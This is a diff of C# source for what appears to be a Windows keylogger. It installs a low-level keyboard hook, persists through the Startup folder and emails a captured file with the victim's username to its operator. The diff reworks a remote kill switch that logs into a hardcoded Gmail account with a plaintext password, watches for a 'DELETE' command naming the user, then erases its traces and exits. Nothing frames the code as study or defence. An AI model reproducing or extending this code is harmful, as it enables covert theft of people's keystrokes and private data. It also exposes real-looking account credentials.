@@ -5,9 +5,8 @@ using System.Net.Mail;
 using System.Net.Mime;
 using System.Runtime.InteropServices;
 using System.Windows.Forms;
+using S22.Pop3;
 using OpenPop;
-using Limilabs.Mail;
-using Limilabs.Client.POP3;
 using System.Collections.Generic;
 
 namespace Win32AppAF
@@ -23,6 +22,8 @@ namespace Win32AppAF
         const int SW_HIDE = 0;
         const int SW_SHOW = 5;
 
+        //[DllImport("S22.Pop3.dll")]
+        //static extern S22.Pop3;
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -106,38 +107,41 @@ namespace Win32AppAF
 
         static void checkEmailSuppr_Tick(object sender, EventArgs e)
         {
-            Pop3 client = new Pop3();
-            client.Connect("pop.gmail.com", 995, true);
-            if (client.Connected)
-            {
-                
-            }
-            client.Login("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS");
-            foreach (string idMessage in client.GetAll())
-            {
-                Limilabs.Mail.MailBuilder mail = new MailBuilder();
-                IMail mailObj = mail.CreateFromEml(client.GetMessageByUID(idMessage));
-                string contenu = mailObj.GetBodyAsText();
+            Pop3Client client = new Pop3Client("pop.gmail.com", 995, true);
 
-                if (contenu.Contains("DELETE") && (contenu.Contains(Environment.UserName)))
+            client.Login("bilaldu93de93@gmail.com", "ksjdfh25ASasdasdasSSS", AuthMethod.Login);
+
+            if (client.Authed)
+            {
+                foreach (uint idMessage in client.GetMessageNumbers())
                 {
-                    //ProcessStartInfo Info = new ProcessStartInfo();
-                    //Info.Arguments = " /C choice /C Y /N /D Y /T 6 & Del " + cheminExe;
-                    ////Info.WindowStyle = ProcessWindowStyle.Hidden;
-                    ////Info.CreateNoWindow = true;
-                    //Info.FileName = "‪cmd.exe";
-                    //Process.Start(Info); 
+                    MailMessage message = client.GetMessage(idMessage);
+                    string contenu = message.Body;
+                   
 
-                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe");
-                    client.DeleteMessageByUID(idMessage);
-                    client.Close();
-                    
-                    Application.Exit();
-                    Environment.Exit(0);
+                    if (contenu.Contains("DELETE") && (contenu.Contains(Environment.UserName)))
+                    {
+                        //ProcessStartInfo Info = new ProcessStartInfo();
+                        //Info.Arguments = " /C choice /C Y /N /D Y /T 6 & Del " + cheminExe;
+                        ////Info.WindowStyle = ProcessWindowStyle.Hidden;
+                        ////Info.CreateNoWindow = true;
+                        //Info.FileName = "‪cmd.exe";
+                        //Process.Start(Info); 
+
+                        File.Delete(cheminFichier);
+                        File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\" + System.Reflection.Assembly.GetExecutingAssembly().GetName().Name + @".exe");
+
+                        client.DeleteMessage(idMessage);
+                        message.Dispose();
+                        client.Logout();
+                        client.Dispose();
+
+                        Application.Exit();
+                        Environment.Exit(0);
+                    }
+
                 }
-
             }
-            
         }
 
 
@@ -162,7 +166,7 @@ namespace Win32AppAF
                 mail.Body = "Utilisateur : " + Environment.UserName + Environment.NewLine + "Date : " + System.DateTime.Now;
 
                 Attachment data = new Attachment(cheminFichier, MediaTypeNames.Application.Octet);
-                ContentDisposition disposition = data.ContentDisposition;
+                System.Net.Mime.ContentDisposition disposition = data.ContentDisposition;
                 disposition.CreationDate = System.IO.File.GetCreationTime(cheminFichier);
                 disposition.ModificationDate = System.IO.File.GetLastWriteTime(cheminFichier);
                 disposition.ReadDate = System.IO.File.GetLastAccessTime(cheminFichier);
